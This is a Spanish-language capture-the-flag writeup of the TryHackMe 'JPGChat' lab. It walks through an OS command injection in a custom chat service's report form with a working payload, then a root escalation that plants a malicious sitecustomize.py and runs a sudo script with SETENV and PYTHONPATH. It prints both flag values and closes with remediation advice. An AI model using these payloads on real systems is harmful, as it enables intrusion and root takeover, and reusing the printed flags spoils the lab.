# JPGChat — Writeup / Reporte de Pentest

**Target:** 10.64.191.23 (reset de máquina THM)
**Servicios:** 22/tcp (OpenSSH 7.2p2 Ubuntu), 3000/tcp (JPChat, servicio Python custom)
**Metodología:** MITRE ATT&CK (Enterprise) — con referencia cruzada CWE-78 / OWASP A03:2021
**Resultado:** `user.txt` y `root.txt` leídos (compromiso total).

---

## Resumen ejecutivo

JPGChat es un servicio de chat personalizado con una **inyección de comandos del sistema operativo** en el flujo `[REPORT]`. Esto permitió RCE como el usuario `wes` (uid 1001) y la lectura de `user.txt`. La escalada a root se logró abusando de una entrada de `sudoers` que permite ejecutar un script Python como root con `SETENV`, combinada con `env_keep+=PYTHONPATH`, mediante un hijack de `PYTHONPATH` (`sitecustomize.py` malicioso).

| Flag | Valor |
|------|-------|
| `user.txt` | `JPC{487030410a543503cbb59ece16178318}` |
| `root.txt` | `JPC{665b7f2e59cf44763e5a7f070b081b0a}` |

---

## Reconocimiento

- Escaneo de puertos: `22` (SSH) y `3000` (JPChat) abiertos.
- Conexión a `:3000` → banner "Welcome to JPChat", comandos `[MESSAGE]` y `[REPORT]`.
- Tras `[REPORT]` el servicio revela el admin ("this report will be read by Mozzie-jpg") y apunta al repo de código fuente en GitHub: **Mozzie-jpg/JPChat**.

---

## Kill chain (MITRE ATT&CK)

### 1. Initial Access — T1190: Exploit Public-Facing Application
El servicio en `:3000` es accesible sin autenticación. El repo fuente mostró la función vulnerable.

```bash
nc 10.64.191.23 3000
# enviar: [REPORT]
```

### 2. Execution — T1059.004: Command and Scripting Interpreter (Unix Shell)
Vulnerabilidad en `report_form()` (jpchat.py):

```python
os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)
```

`your_name` se interpola sin saneamiento dentro de `bash -c '...'`. Rompiendo las comillas simples, cualquier comando se ejecuta en el contexto del servicio.

**PoC (RCE como `wes`):**
```python
# inyección en el campo "your name":
'; id; echo END; cat /home/*/user.txt 2>&1; echo END2; echo '
```
Salida (vuelve por el socket, tras enviar el campo "your report"):
```
uid=1001(wes) gid=1001(wes) groups=1001(wes)
JPC{487030410a543503cbb59ece16178318}
```
> Nota operativa: la salida de la inyección se bufferea y solo aparece **después** de enviar el `x` del campo "your report" (el proceso cierra y hace flush).

Clasificación de la vuln: **CWE-78 (OS Command Injection)** ≈ **OWASP A03:2021 – Injection**.

### 3. Privilege Escalation — T1548.003: Abuse Elevation Control Mechanism (Sudo)
Enumeración como `wes`:
```bash
sudo -n -l
```
```
User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```
`Defaults ... env_keep+=PYTHONPATH` + `SETENV` permiten inyectar `PYTHONPATH`. Se planta `sitecustomize.py` (importado automáticamente al arrancar Python, como root):

```python
import os
os.system("for f in /root/root.txt $(find / -name root.txt 2>/dev/null); do cat $f; done > /tmp/root.txt 2>/dev/null; chmod 666 /tmp/root.txt")
```

**Explotación:**
```bash
# 1) escribir el módulo malicioso (vía la misma inyección)
mkdir -p /tmp/evil
echo <B64> | base64 -d > /tmp/evil/sitecustomize.py

# 2) ejecutar como root con PYTHONPATH hijack
sudo PYTHONPATH=/tmp/evil /usr/bin/python3 /opt/development/test_module.py
cat /tmp/root.txt
```
Resultado: `JPC{665b7f2e59cf44763e5a7f070b081b0a}` (lectura como root).

---

## Tabla de técnicas

| Táctica | Técnica | Detalle |
|---------|---------|---------|
| Initial Access | T1190 | Explotación de servicio expuesto en :3000 |
| Execution | T1059.004 | Inyección de comandos OS en `report_form()` |
| Privilege Escalation | T1548.003 | `sudo` con `SETENV` + hijack de `PYTHONPATH` |
| Collection | — | Lectura de `user.txt` / `root.txt` |

---

## Recomendaciones

1. **Saneamiento de entrada** en `report_form()`: no usar `os.system` con datos de usuario. Usar `subprocess.run([...], shell=False)` o validar estrictamente contra un allowlist.
2. **sudoers**: eliminar `SETENV` y `env_keep+=PYTHONPATH` para el script; restringir a una ruta fija y sin capacidad de alterar el entorno. O ejecutar el script en un entorno sin `PYTHONPATH` controlable por el usuario.
3. **Principle of least privilege**: el servicio no debe ejecutarse con capacidades que permitan escalar a root vía configuración de entorno.

---

*Writeup generado tras compromiso autorizado en el lab TryHackMe "JPGChat".*
